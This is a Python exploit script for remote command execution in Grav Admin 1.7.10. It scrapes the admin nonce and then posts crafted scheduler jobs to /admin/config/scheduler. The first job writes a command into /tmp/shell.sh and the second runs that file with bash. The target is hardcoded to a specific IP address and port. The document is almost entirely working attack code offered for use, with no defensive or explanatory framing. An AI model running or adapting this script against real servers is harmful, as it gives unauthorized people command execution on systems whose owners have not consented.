
import requests
from bs4 import BeautifulSoup
from time import sleep
import urllib.parse
import argparse

# parser = argparse.ArgumentParser(description='Grav Admin 1.7.10 RCE')
# parser.add_argument('-c', help='Command', required=True)
# parser.add_argument('-t', help='URL (Eg: http://grav.local)', required=True)
# args = parser.parse_args()


url = 'http://62.173.140.174:28000/'
cmd = 'ls'
cmd = urllib.parse.quote(cmd)
print('cmd - ', cmd)


session = requests.Session()


# Getting Nonce
r = session.get(url+'/admin')
soup = BeautifulSoup(r.text, features="lxml")
print(soup)
a = str(soup.findAll('input')[3])
print(a)
nonce = a[47:79]




# Creating File
print("[*] Creating File")
payload = f'admin-nonce={nonce}&task=SaveDefault&data[custom_jobs][vwlya][command]=/usr/bin/echo&data[custom_jobs][vwlya][args]={cmd}&data[custom_jobs][vwlya][at]=%2a%20%2a%20%2a%20%2a%20%2a&data[custom_jobs][vwlya][output]=/tmp/shell.sh&data[status][vwlya]=enabled&data[custom_jobs][vwlya][output_mode]=overwrite'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
r = session.post(url+'/admin/config/scheduler',data=payload,headers=headers)

if "Invalid Security Token" in r.text:
	exit("Exploit failed :(")
else:
	print("Scheduled task created for file creation, wait one minute")
	sleep(60)


# Running File
print("[*] Running file")
payload = f'admin-nonce={nonce}&task=SaveDefault&data[custom_jobs][vwlya][command]=/bin/bash&data[custom_jobs][vwlya][args]=/tmp/shell.sh&data[custom_jobs][vwlya][at]=%2a%20%2a%20%2a%20%2a%20%2a&data[custom_jobs][vwlya][output]=&data[status][vwlya]=enabled&data[custom_jobs][vwlya][output_mode]=overwrite'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
r = session.post(url+'/admin/config/scheduler',data=payload,headers=headers)


if "Invalid Security Token" in r.text:
	exit("Exploit failed :(")
else:
	print("Scheduled task created for command, wait one minute")
	sleep(60)

print("Exploit completed")